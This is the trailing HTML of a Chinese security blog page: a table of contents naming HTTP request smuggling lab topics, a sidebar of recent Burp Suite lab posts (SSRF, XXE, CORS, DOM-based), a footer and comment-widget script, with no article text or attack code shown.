请求走私的响应队列中毒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#12-H2-CL%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.12.</span> <span class="toc-text">12.H2.CL请求走私</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#13-%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%E7%9A%84-HTTP-x2F-2-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.13.</span> <span class="toc-text">13.通过 CRLF 注入的 HTTP&#x2F;2 请求走私</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#14-%E9%80%9A%E8%BF%87-CRLF-%E6%B3%A8%E5%85%A5%E6%8B%86%E5%88%86-HTTP-x2F-2-%E8%AF%B7%E6%B1%82"><span class="toc-number">1.14.</span> <span class="toc-text">14.通过 CRLF 注入拆分 HTTP&#x2F;2 请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#15-CL-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81"><span class="toc-number">1.15.</span> <span class="toc-text">15.CL.0 请求走私</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#16-%E5%88%A9%E7%94%A8-HTTP-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%89%A7%E8%A1%8C-Web-%E7%BC%93%E5%AD%98%E4%B8%AD%E6%AF%92"><span class="toc-number">1.16.</span> <span class="toc-text">16.利用 HTTP 请求走私来执行 Web 缓存中毒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#17-%E5%88%A9%E7%94%A8HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E6%9D%A5%E6%89%A7%E8%A1%8CWeb%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97"><span class="toc-number">1.17.</span> <span class="toc-text">17.利用HTTP请求走私来执行Web缓存欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#18-%E7%BB%95%E8%BF%87HTTP-x2F-2-%E8%AF%B7%E6%B1%82%E9%9A%A7%E9%81%93%E7%BB%95%E8%BF%87%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6"><span class="toc-number">1.18.</span> <span class="toc-text">18.绕过HTTP&#x2F;2 请求隧道绕过访问控制</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="http请求走私"/></a><div class="content"><a class="title" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/burpsuite%E9%9D%B6%E5%9C%BA-http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" title="http请求走私">http请求走私</a><time datetime="2023-03-22T05:31:56.897Z" title="发表于 2023-03-22 13:31:56">2023-03-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/SSRF/burpsuite%E9%9D%B6%E5%9C%BA-SSRF/" title="SSRF"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/923cae9672a5ef484ac0ed42599510f0.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/SSRF/burpsuite%E9%9D%B6%E5%9C%BA-SSRF/" title="SSRF">SSRF</a><time datetime="2023-03-10T07:03:17.769Z" title="发表于 2023-03-10 15:03:17">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/XXE/burpsuite%E9%9D%B6%E5%9C%BA-XXE/" title="XXE"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/735eceff91f2a291064f8242242c831b.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE"/></a><div class="content"><a class="title" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/XXE/burpsuite%E9%9D%B6%E5%9C%BA-XXE/" title="XXE">XXE</a><time datetime="2023-03-09T11:53:58.431Z" title="发表于 2023-03-09 19:53:58">2023-03-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/CORS/burpsuite%E9%9D%B6%E5%9C%BA-CORS/" title="CORS"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/b86a37974bed46521a0ed754bb72e45a.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CORS"/></a><div class="content"><a class="title" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/CORS/burpsuite%E9%9D%B6%E5%9C%BA-CORS/" title="CORS">CORS</a><time datetime="2023-03-08T14:35:06.284Z" title="发表于 2023-03-08 22:35:06">2023-03-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/DOM-based/burpsuite%E9%9D%B6%E5%9C%BA-DOM-based/" title="DOM-based"><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/501ea766baf4b2a2c91d2e163d7c4b04.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DOM-based"/></a><div class="content"><a class="title" href="/%E5%AE%9E%E6%88%98/burpsuite%E9%9D%B6%E5%9C%BA/DOM-based/burpsuite%E9%9D%B6%E5%9C%BA-DOM-based/" title="DOM-based">DOM-based</a><time datetime="2023-03-07T12:22:24.248Z" title="发表于 2023-03-07 20:22:24">2023-03-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/1676127097053.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By jiutu2003</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'pmfnQAIlGrKZuL3XuDvicCUP-gzGzoHsz',
+      appKey: '88cFnty7M7cl67dTJrrrLyPB',
+      avatar: 'monsterid',
+      serverURLs: 'https://pmfnqail.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
